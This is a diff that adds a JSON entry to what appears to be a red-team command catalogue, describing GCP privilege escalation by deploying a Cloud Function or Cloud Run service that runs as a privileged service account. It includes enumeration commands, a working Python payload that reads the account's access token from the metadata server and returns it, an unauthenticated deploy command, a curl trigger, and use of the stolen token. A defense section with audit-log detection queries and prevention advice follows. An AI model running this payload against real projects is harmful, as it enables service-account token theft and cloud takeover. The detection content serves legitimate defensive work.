@@ -1,0 +1,104 @@
+{
+  "id": "gcp-cloudfunction-deploy-privesc",
+  "name": "GCP Cloud Function/Run Deploy Privesc - actAs a Privileged SA",
+  "command": "gcloud functions deploy <profile> --runtime python312 --trigger-http --service-account <target>",
+  "description": "Escalate privileges in GCP by deploying (or updating) a Cloud Function or Cloud Run service with a more privileged service account attached, then triggering it to read that SA's access token from the metadata server. Requires cloudfunctions.functions.create/update (or run.services.create) plus iam.serviceAccounts.actAs over the target SA - a classic actAs privilege-escalation path.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "GCP Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "Rhino Security Labs / GCP docs",
+  "tags": [
+    "gcp",
+    "cloud-functions",
+    "cloud-run",
+    "actas",
+    "service-account",
+    "privesc",
+    "metadata"
+  ],
+  "mitre": [
+    "T1078.004",
+    "T1651"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\n  Deploy code that runs AS a privileged SA (you attach it with --service-account,\n  which requires actAs on that SA). The function reads its own SA token from\n  the metadata server and returns it to you.\n\n=== PERMISSIONS ===\n  cloudfunctions.functions.create/update (or run.services.create/update)\n  + iam.serviceAccounts.actAs over the target SA\n  + cloudfunctions.functions.call / an HTTP trigger to invoke it.\n\n=== ENUMERATE SAs YOU CAN actAs ===\n  gcloud iam service-accounts list\n  gcloud projects get-iam-policy <project> --format=json  # find actAs/SA User\n\n=== PAYLOAD (main.py) - leak the attached SA token ===\n  cat > main.py <<'EOF'\nimport urllib.request\ndef pwn(request):\n    url='http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n    req=urllib.request.Request(url, headers={'Metadata-Flavor':'Google'})\n    return urllib.request.urlopen(req).read()\nEOF\n  echo 'functions-framework' > requirements.txt\n\n=== DEPLOY WITH THE PRIVILEGED SA ATTACHED ===\n  gcloud functions deploy <profile> --runtime python312 --trigger-http \\\n    --entry-point pwn --allow-unauthenticated \\\n    --service-account <target> --source .\n\n=== TRIGGER + READ THE TOKEN ===\n  curl \"$(gcloud functions describe <profile> --format='value(httpsTrigger.url)')\"\n  # the returned access_token belongs to <target>; use it:\n  curl -H \"Authorization: Bearer <token>\" \\\n    https://cloudresourcemanager.googleapis.com/v1/projects/<project>\n\n=== CLOUD RUN VARIANT ===\n  gcloud run deploy <profile> --image <img> --service-account <target> --allow-unauthenticated\n\n=== CLEANUP ===\n  gcloud functions delete <profile>",
+  "examples": [
+    {
+      "label": "Deploy a function running as a privileged SA",
+      "command": "gcloud functions deploy <profile> --runtime python312 --trigger-http --entry-point pwn --service-account <target> --source ."
+    },
+    {
+      "label": "Trigger and read the SA token",
+      "command": "curl \"$(gcloud functions describe <profile> --format='value(httpsTrigger.url)')\""
+    },
+    {
+      "label": "Cloud Run variant",
+      "command": "gcloud run deploy <profile> --image <img> --service-account <target> --allow-unauthenticated"
+    }
+  ],
+  "references": [
+    {
+      "title": "Rhino Security Labs - GCP privilege escalation (part 2)",
+      "url": "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
+    },
+    {
+      "title": "GCP docs - Cloud Functions identity (per-function SA)",
+      "url": "https://cloud.google.com/functions/docs/securing/function-identity"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gcp-sa-impersonation",
+      "note": "Direct impersonation is the related actAs primitive.",
+      "rel": "alternative"
+    },
+    {
+      "id": "gcp-metadata-token",
+      "note": "The function reads the SA token from the metadata server.",
+      "rel": "next"
+    },
+    {
+      "id": "gcp-iam-privesc",
+      "note": "Catalogue of GCP IAM privesc including deploy paths.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Attaching a service account to a Cloud Function/Run service is a normal deploy option gated by iam.serviceAccounts.actAs. Code deployed this way runs as the attached SA and can read that SA's token from the metadata server, so deploy rights plus actAs over a privileged SA equal that SA's permissions.",
+    "prerequisites": "cloudfunctions.functions.create/update (or run.services.create/update), iam.serviceAccounts.actAs over the target SA, and the ability to invoke the deployed service.",
+    "impact": "Privilege escalation to the attached SA's roles (often far broader than the attacker's own), token theft, and persistence via a long-lived deployed service.",
+    "detection": "[MITRE T1651] Cloud Audit Logs CreateFunction/UpdateFunction or run.services.create with a serviceAccountEmail the deployer does not own, paired with iam.serviceAccounts.actAs; new unauthenticated/HTTP-triggered functions; the attached SA's token used from outside GCP.",
+    "artifacts": "Audit log google.cloud.functions.v1.CloudFunctionsService.CreateFunction/UpdateFunction (or Cloud Run services.create) with request.function.serviceAccountEmail; actAs authorization entries; subsequent API calls by the target SA from unusual IPs.",
+    "splunk_spl": "index=gcp (protoPayload.methodName=\"*CreateFunction*\" OR protoPayload.methodName=\"*UpdateFunction*\" OR protoPayload.methodName=\"*run.services.create*\")\n| stats count by protoPayload.authenticationInfo.principalEmail, protoPayload.request.function.serviceAccountEmail",
+    "elastic_kql": "gcp.audit.method_name:(*CreateFunction* or *UpdateFunction* or *services.create*) and gcp.audit.service_name:(cloudfunctions.googleapis.com or run.googleapis.com)",
+    "sentinel_kql": "GCPAuditLogs\n| where MethodName has_any (\"CreateFunction\",\"UpdateFunction\",\"services.create\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+    "sigma_rules": "gcp_function_deploy_actas_privesc",
+    "prevention": "Restrict iam.serviceAccounts.actAs and the per-function/Run default SA; grant deployed services least-privilege SAs, never the default Compute SA with Editor; require authenticated invocation (no --allow-unauthenticated); use Organization Policy to constrain allowed SAs; alert on deploys that attach an SA the deployer does not control.",
+    "sources": [
+      "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/",
+      "https://cloud.google.com/functions/docs/securing/function-identity"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Function/Run deploy attaching a privileged service account",
+        "logic": "GCPAuditLogs\n| where ServiceName in (\"cloudfunctions.googleapis.com\",\"run.googleapis.com\")\n| where MethodName has_any (\"CreateFunction\",\"UpdateFunction\",\"services.create\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+        "data_source": "gcp-audit",
+        "attack": [
+          "T1651",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate CI/CD deploying functions/services with dedicated SAs",
+        "tuning": "Allowlist deploy pipelines and the SAs they legitimately attach; alert when a principal attaches an SA it does not own or deploys unauthenticated endpoints"
+      }
+    ]
+  }
+}
